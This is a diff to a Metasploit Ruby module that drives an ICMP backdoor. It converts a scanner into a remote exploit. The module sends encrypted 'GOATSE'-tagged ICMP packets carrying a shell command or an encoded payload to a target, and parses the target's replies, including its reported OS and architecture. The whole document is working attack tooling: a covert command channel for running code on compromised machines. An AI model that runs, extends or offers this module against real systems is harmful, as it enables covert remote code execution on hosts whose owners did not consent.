@@ -5,13 +5,10 @@
 
 require 'msf/core'
 
-class MetasploitModule < Msf::Auxiliary
+class MetasploitModule < Msf::Exploit::Remote
   Rank = ManualRanking
 
   include Msf::Exploit::Capture
-  include Msf::Auxiliary::Report
-  include Msf::Auxiliary::Scanner
-  include Msf::Auxiliary::AuthBrute
 
   def initialize(info = {})
     super(update_info(info,
@@ -29,13 +26,13 @@ class MetasploitModule < Msf::Auxiliary
           'BadChars'    => '',
           'DisableNops' => true,
         },
-      'Platform'       => %w{ linux bsd win },
-      'Arch'           => ARCH_ALL,
+      'Platform'       => %w{ linux bsd },
+      'Arch'           => [ARCH_X86, ARCH_X64],
       'Targets'        => [ [ 'Universal', { } ] ],
       'DefaultTarget'  => 0
       ))
 
-      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT', 'BLANK_PASSWORDS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'PASSWORD', 'PASS_FILE', 'USERNAME', 'USERPASS_FILE', 'USER_AS_PASS', 'USER_FILE', 'BRUTEFORCE_SPEED')
+      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN')
       register_options(
       [
         OptString.new('SHOST',   [false, 'The source address of the ICMP packet', nil]),
@@ -46,14 +43,17 @@ class MetasploitModule < Msf::Auxiliary
       ], self.class)
   end
 
-  def run_host(ip)
+  def exploit
+
     check_pcaprub_loaded
 
     open_pcap
     pcap = self.capture
-    capture_sendto(build_icmp(ip), ip, datastore['BROADCAST'])
+    capture_sendto(build_icmp(rhost), rhost, datastore['BROADCAST'])
 
     data = ""
+    os = "Unknown"
+    arch = "i386"
     begin
       Timeout.timeout(datastore['TIMEOUT']) do
         each_packet do |pkt|
@@ -65,10 +65,23 @@ class MetasploitModule < Msf::Auxiliary
           next unless p.payload.size % datastore['BLOCK_SIZE'] == 0
           decoded = crypt_data(p.payload[128..], p.payload[0..127])
           
-          if decoded.start_with?("GOATSE\x00")
+          if decoded.start_with?("GOATSE") and ((decoded[6].ord & 0x3 == 0))
+            if decoded[6].ord & 0x80
+              os = "Linux"
+            elsif decoded[6].ord & 0x40
+              os = "BSD"
+            elsif decoded[6].ord & 0x20
+              os = "Windows"
+            end
+
+            if decoded[6].ord & 0x10
+              arch = "x86_64"
+            end
+
             decoded = decoded[7..]
             data_len  = decoded[..1].unpack('S<')[0]
             data << "#{decoded[1..data_len]}\n"
+
           end
         end
       end
@@ -79,9 +92,11 @@ class MetasploitModule < Msf::Auxiliary
     close_pcap
 
     if data.size > 0
-	print_good("#{ip}: #{data}".chomp)
+	print_good("#{rhost} (#{os} #{arch})\n#{data}".chomp)
     else
-      print_error "No response received."
+      if datastore['CMD']
+        print_error "No response received."
+      end
     end
   end
 
@@ -116,7 +131,7 @@ class MetasploitModule < Msf::Auxiliary
       if datastore['PAYLOAD'].nil? || datastore['PAYLOAD'] == ''
         fail_with(Failure::BadConfig, "CMD was not specified and no PAYLOAD was set")
       else
-        data = "GOATSE\x01" + payload.encoded
+        data = "GOATSE\x01" + [payload.encoded.size].pack('S<') + payload.encoded
       end
     else
       data = "GOATSE\x02" + [datastore['CMD'].size].pack('S<') + datastore['CMD']
